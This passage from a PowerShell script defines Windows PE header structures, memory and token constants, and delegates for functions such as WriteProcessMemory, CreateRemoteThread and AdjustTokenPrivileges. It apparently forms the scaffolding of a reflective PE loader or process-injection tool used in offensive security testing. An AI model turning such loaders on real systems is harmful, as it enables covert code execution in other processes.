		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object

		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0

		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object

		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc

		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx

		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy

		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset

		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary

		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress

		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr

		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree

		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx

		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect

		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle

		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary

		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess

		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject

		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory

		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory

		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread

		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread

		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken

		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread

		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
